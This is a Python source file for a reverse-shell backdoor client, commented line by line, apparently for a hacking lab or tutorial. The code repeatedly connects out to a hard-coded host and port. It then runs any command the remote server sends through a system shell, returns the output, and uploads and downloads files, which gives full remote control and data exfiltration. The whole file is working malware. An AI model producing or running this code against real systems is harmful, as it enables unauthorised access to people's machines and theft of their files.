import socket # Provides low-level networking interfaces. It allows you to create and manage network connections using protocols like TCP and UDP.
import time # Provides various functions for working with time-related operations.
import subprocess # Allows use to run system commands or external programs from your Python script.
import json # Used for storing and transferring data between the browser and the server.
import os # Import the os module for interacting with the file system.

# Function to send data reliably in JSON format
def reliable_send(data):
    jsondata = json.dumps(data)       # Convert Python object into JSON string
    s.send(jsondata.encode())         # Encode JSON string to bytes and send it over the socket

# Function to receive JSON data reliably
def reliable_recv():
    data = ''                         # Initialize empty string to store received data
    while True:                       # Loop until a complete JSON message is received
        try:
            data = data + s.recv(1024).decode().rstrip() # Receive up to 1024 bytes, decode to string, strip trailing spaces
            return json.loads(data)    # Convert JSON string back to Python object and return it
        except ValueError:             # If JSON is incomplete or malformed
            continue                   # Keep receiving more data until complete

# Function to maintain a persistent connection to the server
def connection():
    while True:                        # Loop until a successful connection is made
        time.sleep(20)                 # Wait 20 seconds before attempting a connection
        try:
            s.connect(('10.0.2.22', 12345)) # Connect to the server at IP 10.0.2.22 on port 12345
            shell()                     # Start the shell function to handle commands
            s.close()                   # Close the connection after the shell loop ends
            break                       # Exit the loop after successful execution
        except:                         # If connection fails
            continue                    # Retry after the delay

# Function to send a file to the server
def upload_file(file_name):
    f = open(file_name, 'rb')           # Open file in binary read mode
    s.send(f.read())                    # Read entire file content and send it through the socket

# Function to receive a file from the server
def download_file(file_name):
    f = open(file_name, 'wb')           # Open file in binary write mode
    s.settimeout(1)                     # Set socket timeout to 1 second
    chunk = s.recv(1024)                # Receive first chunk of file data
    while chunk:                        # Continue until no more data is received
        f.write(chunk)                  # Write the received chunk to file
        try:
            chunk = s.recv(1024)        # Attempt to receive the next chunk
        except socket.timeout as e:     # Stop receiving if no more data arrives within timeout
            break
    s.settimeout(None)                  # Remove timeout setting
    f.close()                           # Close the file

# Function to handle incoming commands from the server
def shell():
    while True:                         # Keep listening for commands
        command = reliable_recv()       # Receive the command from server
        if command == 'exit' or command == 'quit': # If exit or quit command received
            break                       # End the shell session
        elif command[:3] == 'cd ':      # If command is 'cd ', change directory
            os.chdir(command[3:])       # Change current working directory to specified path
        elif command == 'clear':        # If clear command received
            pass                        # Do nothing locally (handled on server side)
        elif command[:9] == 'download': # If download command received
            upload_file(command[9:])    # Send specified file to the server
        elif command[:6] == 'upload':   # If upload command received
            download_file(command[7:])  # Receive file from the server
        else:                           # For all other commands
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # Execute the command
            result = execute.stdout.read() + execute.stderr.read() # Capture standard output and error
            result = result.decode()    # Decode result from bytes to string
            reliable_send(result)       # Send the command output back to the server

# Create a socket object for TCP communication using IPv4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET = IPv4, SOCK_STREAM = TCP

connection() # Call connection function to start the connection process